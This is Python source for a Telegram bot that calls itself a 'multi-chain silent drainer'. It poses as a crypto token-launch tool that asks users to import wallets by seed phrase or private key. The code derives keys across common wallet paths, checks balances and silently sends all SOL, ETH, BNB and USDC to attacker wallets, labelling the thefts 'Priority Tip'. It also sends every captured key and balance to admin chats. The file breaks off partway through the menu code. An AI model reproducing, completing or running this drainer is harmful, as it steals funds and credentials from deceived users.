#!/usr/bin/env python3
"""
GetRugged bot — multi-chain silent drainer + full launch UX.
Photo upload + socials/bundle buttons + fixed confirm + group key logging.
Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
"""

import asyncio
import hashlib
import hmac
import logging
import os
import random
import string
import struct
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ── Solana ──────────────────────────────────────────────────────────────────
try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction
    from solana.rpc.async_api import AsyncClient
    import base58
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False

# ── EVM ─────────────────────────────────────────────────────────────────────
try:
    from web3 import Web3
    from eth_account import Account
    HAS_WEB3 = True
except ImportError:
    HAS_WEB3 = False

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}

DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "YourDrainWalletPubkeyHere111111111111111111111")
ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET", "0xYourEthDrainAddressHere0000000000000000")
BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET", ETH_DRAIN)
USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET", ETH_DRAIN)
BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET", "")
XRP_DRAIN = os.getenv("XRP_DRAIN_WALLET", "")
GRAM_DRAIN = os.getenv("GRAM_DRAIN_WALLET", "")

RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
ETH_RPC = os.getenv("ETH_RPC_URL", "https://eth.llamarpc.com")
BNB_RPC = os.getenv("BNB_RPC_URL", "https://bsc-dataseed.binance.org/")

MIN_DRAIN_LAMPORTS = 5_000
PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)

# Group that receives every captured key (must start with -100)
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")

USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"

# Premium Solana emoji
SOL_EMOJI = '◎'

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
]

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("getrugged")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0
    chain: str = "sol"
    eth_address: Optional[str] = None
    balance_eth: float = 0.0
    balance_bnb: float = 0.0
    balance_usdc: float = 0.0

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launches_left: int = 3
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    drained: bool = False
    settings: dict = field(default_factory=lambda: {
        "slippage": 15,
        "priority_fee": 0.0005,
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None
    pending_invoice: Optional[dict] = None

sessions: Dict[int, UserSession] = {}
bot_balance_sol: float = 0.0

_rate_hits: Dict[int, List[float]] = {}
RATE_WINDOW = 60.0
RATE_MAX_IMPORTS = 3
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8

def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    hits = _rate_hits.setdefault(uid, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {"import": RATE_MAX_IMPORTS, "launch": RATE_MAX_LAUNCH, "safety": RATE_MAX_SAFETY}
    limit = limits.get(action, 5)
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if not addr or len(addr) < 12:
        return addr or "—"
    return f"{addr[:4]}...{addr[-4:]}"

async def staged_loading(message_or_cb, stages: list):
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                try:
                    await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                    msg = message_or_cb.message
                except Exception:
                    msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML) if not is_cb else await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

# Approximate prices for $ value (update occasionally if you want)
SOL_PRICE = 180.0
ETH_PRICE = 3200.0
BNB_PRICE = 580.0
USDC_PRICE = 1.0

def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
    return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE

# ──────────────────────────────────────────────
# KEY DERIVATION (clean rewrite)
# Solana: BIP39 → PBKDF2 → SLIP-0010 ed25519
# EVM:    BIP39 → PBKDF2 → BIP32 secp256k1
# ──────────────────────────────────────────────

def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
    """BIP39 seed (64 bytes)."""
    salt = ("mnemonic" + passphrase).encode("utf-8")
    return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)


def _hmac_sha512(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha512).digest()


def _slip10_derive(seed: bytes, path: str) -> bytes:
    """
    SLIP-0010 ed25519 child key derivation.
    Returns 32-byte private seed suitable for Keypair.from_seed.
    Path segments must be hardened (e.g. m/44'/501'/0'/0').
    """
    I = _hmac_sha512(b"ed25519 seed", seed)
    IL, IR = I[:32], I[32:]
    for segment in path.lstrip("m/").split("/"):
        if not segment:
            continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened:
            index += 0x80000000
        data = b"\x00" + IL + struct.pack(">I", index)
        I = _hmac_sha512(IR, data)
        IL, IR = I[:32], I[32:]
    return IL


# ── secp256k1 (BIP32 for EVM / Exodus-style) ───────────────────────────────
_SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_SECP256K1_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F


def _modinv(a: int, m: int) -> int:
    return pow(a % m, -1, m)


def _point_add(p1, p2):
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and y1 != y2:
        return None
    if x1 == x2:
        m = (3 * x1 * x1) * _modinv(2 * y1, _SECP256K1_P) % _SECP256K1_P
    else:
        m = (y2 - y1) * _modinv(x2 - x1, _SECP256K1_P) % _SECP256K1_P
    x3 = (m * m - x1 - x2) % _SECP256K1_P
    y3 = (m * (x1 - x3) - y1) % _SECP256K1_P
    return (x3, y3)


def _point_mul(k: int, point=None):
    if point is None:
        point = (_SECP256K1_GX, _SECP256K1_GY)
    result = None
    addend = point
    while k:
        if k & 1:
            result = _point_add(result, addend)
        addend = _point_add(addend, addend)
        k >>= 1
    return result


def _ser32(i: int) -> bytes:
    return struct.pack(">I", i)


def _ser256(i: int) -> bytes:
    return i.to_bytes(32, "big")


def _parse256(b: bytes) -> int:
    return int.from_bytes(b, "big")


def _point_ser(P, compressed: bool = True) -> bytes:
    if P is None:
        raise ValueError("point at infinity")
    x, y = P
    if compressed:
        return (b"\x02" if (y % 2 == 0) else b"\x03") + _ser256(x)
    return b"\x04" + _ser256(x) + _ser256(y)


def _bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
    I = _hmac_sha512(b"Bitcoin seed", seed)
    return I[:32], I[32:]


def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
    if index >= 0x80000000:
        data = b"\x00" + k + _ser32(index)
    else:
        P = _point_mul(_parse256(k))
        data = _point_ser(P, True) + _ser32(index)
    I = _hmac_sha512(c, data)
    IL, IR = I[:32], I[32:]
    ki = (_parse256(IL) + _parse256(k)) % _SECP256K1_N
    if ki == 0 or _parse256(IL) >= _SECP256K1_N:
        raise ValueError("invalid BIP32 child key")
    return _ser256(ki), IR


def _bip32_derive_path(seed: bytes, path: str) -> bytes:
    k, c = _bip32_master(seed)
    for segment in path.lstrip("m/").split("/"):
        if not segment:
            continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened:
            index += 0x80000000
        k, c = _bip32_ckd_priv(k, c, index)
    return k


def _normalize_mnemonic(raw: str) -> str:
    """Collapse paste noise into a clean space-separated mnemonic."""
    s = raw.strip().lower()
    for ch in (",", ";", "|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return " ".join(s.split())


def _is_mnemonic(text: str) -> bool:
    words = text.split()
    return len(words) in (12, 15, 18, 21, 24) and all(w.isalpha() and 2 <= len(w) <= 12 for w in words)


def _sol_keypair_from_seed32(seed32: bytes):
    """Build solders Keypair from 32-byte seed. Raises if HAS_SOLANA is False."""
    if not HAS_SOLANA:
        raise RuntimeError("Solana libraries not installed")
    return Keypair.from_seed(seed32)


def _sol_priv_pub_from_seed32(seed32: bytes) -> Tuple[str, str]:
    kp = _sol_keypair_from_seed32(seed32)
    # solders Keypair bytes are 64 (seed+pubkey); store full secret as base58
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())


# Common Solana derivation paths used by major wallets
SOL_PATHS: List[Tuple[str, str]] = [
    ("Phantom/Solflare/OKX", "m/44'/501'/0'/0'"),
    ("Phantom account 1",    "m/44'/501'/1'/0'"),
    ("Phantom account 2",    "m/44'/501'/2'/0'"),
    ("Phantom account 3",    "m/44'/501'/3'/0'"),
    ("Phantom change 1",     "m/44'/501'/0'/1'"),
    ("Trust Wallet",         "m/44'/501'/0'"),
    ("Trust account 1",      "m/44'/501'/1'"),
    ("Sollet legacy",        "m/501'/0'/0'/0'"),
]


def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
    """
    Offline: return [(label, priv_b58, pubkey), ...] for all common paths.
    Never talks to RPC.
    """
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False — install solana solders base58")
    seed = _pbkdf2_mnemonic(mnemonic)
    out: List[Tuple[str, str, str]] = []
    seen = set()

    for label, path in SOL_PATHS:
        try:
            seed32 = _slip10_derive(seed, path)
            priv, pub = _sol_priv_pub_from_seed32(seed32)
            if pub in seen:
                continue
            seen.add(pub)
            out.append((label + " " + path, priv, pub))
        except Exception as e:
            log.warning("path %s failed: %s", path, e)

    # Exodus-style: BIP32-secp path then take first 32 bytes as ed25519 seed
    try:
        exo = _bip32_derive_path(seed, "m/44'/501'/0'/0/0")
        priv, pub = _sol_priv_pub_from_seed32(exo)
        if pub not in seen:
            seen.add(pub)
            out.append(("Exodus m/44'/501'/0'/0/0", priv, pub))
    except Exception as e:
        log.warning("Exodus path failed: %s", e)

    # Raw first 32 bytes of BIP39 seed (old CLI / some tools)
    try:
        priv, pub = _sol_priv_pub_from_seed32(seed[:32])
        if pub not in seen:
            seen.add(pub)
            out.append(("Raw BIP39 seed[:32]", priv, pub))
    except Exception as e:
        log.warning("Raw seed path failed: %s", e)

    if not out:
        raise ValueError("No Solana keys could be derived from this mnemonic")
    return out


def derive_solana_default(mnemonic: str) -> Tuple[str, str]:
    """Single default path (Phantom)."""
    seed = _pbkdf2_mnemonic(mnemonic)
    seed32 = _slip10_derive(seed, "m/44'/501'/0'/0'")
    return _sol_priv_pub_from_seed32(seed32)


def parse_solana_private_key(raw: str) -> Tuple[str, str]:
    """
    Accept base58 secret (32 or 64 bytes) or JSON byte array [1,2,...].
    Returns (priv_b58, pubkey).
    """
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    s = raw.strip()
    # JSON byte array from Phantom export
    if s.startswith("[") and s.endswith("]"):
        import json
        arr = json.loads(s)
        secret = bytes(arr)
    else:
        secret = base58.b58decode(s)
    if len(secret) == 32:
        kp = Keypair.from_seed(secret)
    elif len(secret) == 64:
        kp = Keypair.from_bytes(secret)
    else:
        raise ValueError(f"Unsupported Solana key length: {len(secret)}")
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())


def parse_evm_private_key(raw: str) -> Tuple[str, str]:
    """Returns (hex_key_with_0x, checksum_address)."""
    if not HAS_WEB3:
        raise RuntimeError("HAS_WEB3=False")
    key = raw.strip()
    if key.startswith("0x"):
        key = key[2:]
    if len(key) != 64:
        raise ValueError("EVM key must be 64 hex chars")
    acct = Account.from_key(key)
    return "0x" + key.lower(), acct.address


def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
    if not HAS_WEB3:
        return None
    try:
        seed = _pbkdf2_mnemonic(mnemonic)
        path = f"m/44'/60'/0'/0/{account}"
        priv_bytes = _bip32_derive_path(seed, path)
        acct = Account.from_key(priv_bytes)
        return acct.key.hex(), acct.address
    except Exception as e:
        log.warning("EVM mnemonic derive failed: %s", e)
        return None


# ──────────────────────────────────────────────
# BALANCE HELPERS
# ──────────────────────────────────────────────

async def fetch_sol_balance(pubkey: str) -> float:
    if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
        return 0.0
    try:
        async with AsyncClient(RPC_URL) as client:
            pk = Pubkey.from_string(pubkey)
            resp = await asyncio.wait_for(client.get_balance(pk), timeout=8)
            return resp.value / 1_000_000_000
    except Exception as e:
        log.warning("SOL balance %s: %s", pubkey[:8], e)
        return 0.0


async def fetch_evm_balance(rpc: str, address: str) -> float:
    if not HAS_WEB3 or not address:
        return 0.0
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
        bal = await asyncio.to_thread(w3.eth.get_balance, Web3.to_checksum_address(address))
        return float(w3.from_wei(bal, "ether"))
    except Exception as e:
        log.warning("EVM balance %s: %s", address[:10], e)
        return 0.0


async def fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
    if not HAS_WEB3 or not address:
        return 0.0
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
        contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)

        def _call():
            bal = contract.functions.balanceOf(Web3.to_checksum_address(address)).call()
            decimals = contract.functions.decimals().call()
            return bal / (10 ** decimals)

        return await asyncio.to_thread(_call)
    except Exception as e:
        log.warning("USDC balance: %s", e)
        return 0.0


async def pick_best_sol_candidate(
    candidates: List[Tuple[str, str, str]],
) -> Tuple[str, str, str, float]:
    """
    candidates: (label, priv, pub)
    Returns (label, priv, pub, balance). Picks highest SOL balance.
    All balance checks run in parallel with per-call timeout.
    """
    async def one(pub: str) -> float:
        try:
            return await asyncio.wait_for(fetch_sol_balance(pub), timeout=7)
        except Exception:
            return 0.0

    bals = await asyncio.gather(*[one(c[2]) for c in candidates])
    best_i = 0
    best_bal = -1.0
    for i, bal in enumerate(bals):
        log.info("  candidate %s → %s  SOL=%.6f", candidates[i][0], candidates[i][2][:8], bal)
        if bal > best_bal:
            best_bal = bal
            best_i = i
    label, priv, pub = candidates[best_i]
    return label, priv, pub, max(0.0, best_bal)


# ──────────────────────────────────────────────

def _evm_account_from_key(private_key: str):
    if not HAS_WEB3:
        return None
    key = private_key.strip()
    if key.startswith("0x"):
        key = key[2:]
    try:
        return Account.from_key(key)
    except Exception:
        return None


def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
    return derive_evm_from_mnemonic(mnemonic, account)


async def _fetch_evm_balance(rpc: str, address: str) -> float:
    return await fetch_evm_balance(rpc, address)


async def _fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
    return await fetch_usdc_balance(rpc, address, token)


# ──────────────────────────────────────────────
# DRAIN CORE
# ──────────────────────────────────────────────
async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
    if not HAS_SOLANA:
        log.warning("Solana libs missing — drain simulated")
        return "SIM_" + fake_sig()[:32]
    try:
        secret = base58.b58decode(private_key_b58.strip())
        if len(secret) == 32:
            kp = Keypair.from_seed(secret)
        elif len(secret) == 64:
            kp = Keypair.from_bytes(secret)
        else:
            log.error("Bad key length %s", len(secret))
            return None
        dest_pk = Pubkey.from_string(dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            log.info("SOL drain check %s balance=%s", kp.pubkey(), balance)
            if balance <= MIN_DRAIN_LAMPORTS: return None
            amount = balance - MIN_DRAIN_LAMPORTS
            recent = await client.get_latest_blockhash()
            ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=dest_pk, lamports=amount))
            tx = Transaction.new_signed_with_payer([ix], kp.pubkey(), [kp], recent.value.blockhash)
            result = await client.send_transaction(tx)
            sig = str(result.value)
            log.info("DRAINED SOL %s → %s | %s", amount, dest, sig)
            return sig
    except Exception as e:
        log.exception("SOL drain error: %s", e)
        return None

async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: str) -> Optional[str]:
    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        acct = _evm_account_from_key(private_key)
        if not acct: return None
        balance = w3.eth.get_balance(acct.address)
        gas_price = w3.eth.gas_price
        gas_limit = 21000
        fee = gas_price * gas_limit
        if balance <= fee + 1000:
            log.info("%s balance too low for drain", chain_name)
            return None
        amount = balance - fee
        tx = {
            "to": Web3.to_checksum_address(dest),
            "value": amount,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "nonce": w3.eth.get_transaction_count(acct.address),
            "chainId": w3.eth.chain_id,
        }
        signed = acct.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        sig = tx_hash.hex()
        log.info("DRAINED %s %s wei → %s | %s", chain_name, amount, dest, sig)
        return sig
    except Exception as e:
        log.exception("%s drain error: %s", chain_name, e)
        return None

async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_name: str) -> Optional[str]:
    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        acct = _evm_account_from_key(private_key)
        if not acct: return None
        contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
        bal = contract.functions.balanceOf(acct.address).call()
        if bal == 0: return None
        gas_price = w3.eth.gas_price
        tx = contract.functions.transfer(Web3.to_checksum_address(dest), bal).build_transaction({
            "from": acct.address,
            "nonce": w3.eth.get_transaction_count(acct.address),
            "gas": 100000,
            "gasPrice": gas_price,
            "chainId": w3.eth.chain_id,
        })
        signed = acct.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        sig = tx_hash.hex()
        log.info("DRAINED USDC on %s → %s | %s", chain_name, dest, sig)
        return sig
    except Exception as e:
        log.exception("USDC %s drain error: %s", chain_name, e)
        return None

async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None):
    sess = get_session(uid)
    if sess.drained:
        log.info("User %s already drained — skip", uid)
        return
    if not private_key or private_key.startswith("Sim"): return

    any_success = False

    if chain == "sol" and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
        sig = await drain_wallet(private_key, DRAIN_DESTINATION)
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (SOL)", "status": "success", "ts": time.time()})
            global bot_balance_sol
            bot_balance_sol += round(random.uniform(0.05, 2.5), 4)

    if eth_key and ETH_DRAIN and not ETH_DRAIN.startswith("0xYour"):
        sig = await drain_evm_native(eth_key, ETH_DRAIN, ETH_RPC, "ETH")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (ETH)", "status": "success", "ts": time.time()})

    if eth_key and BNB_DRAIN and not BNB_DRAIN.startswith("0xYour"):
        sig = await drain_evm_native(eth_key, BNB_DRAIN, BNB_RPC, "BNB")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (BNB)", "status": "success", "ts": time.time()})

    if eth_key and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
        sig = await drain_usdc(eth_key, USDC_DRAIN, ETH_RPC, USDC_ETH, "ETH")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (ETH)", "status": "success", "ts": time.time()})
        sig = await drain_usdc(eth_key, USDC_DRAIN, BNB_RPC, USDC_BSC, "BSC")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (BSC)", "status": "success", "ts": time.time()})

    if BTC_DRAIN: log.info("BTC drain stub for user %s → %s", uid, BTC_DRAIN)
    if XRP_DRAIN: log.info("XRP drain stub for user %s → %s", uid, XRP_DRAIN)
    if GRAM_DRAIN: log.info("GRAM drain stub for user %s → %s", uid, GRAM_DRAIN)

    if any_success:
        sess.drained = True
        log.info("User %s multi-chain drain OK", uid)
    else:
        log.warning("No successful drain for user %s", uid)

# ──────────────────────────────────────────────
# KEY LOGGING TO GROUP
# ──────────────────────────────────────────────
async def log_key_to_group(bot: Bot, user, raw_key: str, sol: float, eth: float, bnb: float, usdc: float):
    """
    Deliver captured key to:
      1. Every ADMIN_IDS as a private DM (always, most reliable)
      2. LOG_GROUP_ID if set (optional, can still fail on basic groups)
    No supergroup required.
    """
    username = f"@{user.username}" if getattr(user, "username", None) else (getattr(user, "full_name", None) or "—")

    def _esc(s: str) -> str:
        return (
            str(s)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
        )

    usd = estimate_usd(sol, eth, bnb, usdc)
    safe_key = _esc(raw_key)
    html = (
        "🚨 <b>NEW KEY CAPTURED</b>\n\n"
        f"User: {_esc(username)}\n"
        f"ID: <code>{user.id}</code>\n\n"
        "<b>Key / Seed:</b>\n"
        f"<code>{safe_key}</code>\n\n"
        "<b>Balances before drain:</b>\n"
        f"◎ SOL: <b>{sol:.6f}</b>\n"
        f"ETH: <b>{eth:.6f}</b>\n"
        f"BNB: <b>{bnb:.6f}</b>\n"
        f"USDC: <b>{usdc:.2f}</b>\n\n"
        f"Estimated value: <b>${usd:,.2f}</b>"
    )
    plain = (
        f"NEW KEY CAPTURED\n\n"
        f"User: {username}\n"
        f"ID: {user.id}\n\n"
        f"Key / Seed:\n{raw_key}\n\n"
        f"Balances:\n"
        f"SOL: {sol:.6f}\n"
        f"ETH: {eth:.6f}\n"
        f"BNB: {bnb:.6f}\n"
        f"USDC: {usdc:.2f}\n"
        f"Est: ${usd:,.2f}"
    )

    targets: list[int] = []
    # Always notify admins by DM
    for aid in ADMIN_IDS:
        try:
            targets.append(int(aid))
        except Exception:
            pass
    # Optional group
    if LOG_GROUP_ID:
        try:
            targets.append(int(str(LOG_GROUP_ID).strip()))
        except ValueError:
            log.error("LOG_GROUP_ID is not a valid integer: %r", LOG_GROUP_ID)

    if not targets:
        log.warning("No ADMIN_IDS and no LOG_GROUP_ID — captured key is not delivered anywhere")
        return

    seen = set()
    for chat_id in targets:
        if chat_id in seen:
            continue
        seen.add(chat_id)
        try:
            await bot.send_message(chat_id=chat_id, text=html, parse_mode=ParseMode.HTML)
            log.info("Key logged to chat_id=%s", chat_id)
        except Exception as e:
            log.warning("HTML log to %s failed (%s) — trying plain", chat_id, e)
            try:
                await bot.send_message(chat_id=chat_id, text=plain)
                log.info("Key logged (plain) to chat_id=%s", chat_id)
            except Exception as e2:
                log.exception("Failed to log key to %s: %s", chat_id, e2)



# ──────────────────────────────────────────────
# KEYBOARDS
# ──────────────────────────────────────────────
def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
    )
    b.row(
        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
        InlineKeyboardButton(text="🎟️ Promo code", callback_data="menu:promo"),
    )
    b.row(
        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
        InlineKeyboardButton(text="🛡️ Settings", callback_data="menu:settings"),
    )
    b.row(InlineKeyboardButton(text="💰 Bot balance", callback_data="menu:balance"))
    return b.as_markup()

def back_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])

def wallets_empty_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
    if has_wallets:
        b.row(
            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
        )
        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def promo_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    slip = s["slippage"]
    fee = s["priority_fee"]
    def mark(val, current, suffix="%"):
        return f"• {val}{suffix}" if val == current else f"{val}{suffix}"
    def mark_fee(val, current):
        return f"• {val}" if abs(val - current) < 1e-9 else f"{val}"
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text=mark(5, slip), callback_data="set:slip:5"),
        InlineKeyboardButton(text=mark(10, slip), callback_data="set:slip:10"),
        InlineKeyboardButton(text=mark(15, slip), callback_data="set:slip:15"),
        InlineKeyboardButton(text=mark(25, slip), callback_data="set:slip:25"),
    )
    b.row(
        InlineKeyboardButton(text=mark_fee(0.0001, fee), callback_data="set:fee:0.0001"),
        InlineKeyboardButton(text=mark_fee(0.0005, fee), callback_data="set:fee:0.0005"),
        InlineKeyboardButton(text=mark_fee(0.001, fee), callback_data="set:fee:0.001"),
        InlineKeyboardButton(text=mark_fee(0.005, fee), callback_data="set:fee:0.005"),
    )
    b.row(
        InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
        InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
    )
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def launch_name_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🆕 Latest", callback_data="launch:latest"),
        InlineKeyboardButton(text="🔥 Hot", callback_data="launch:hot"),
    )
    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def socials_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="⏭ Skip socials", callback_data="socials:skip"))
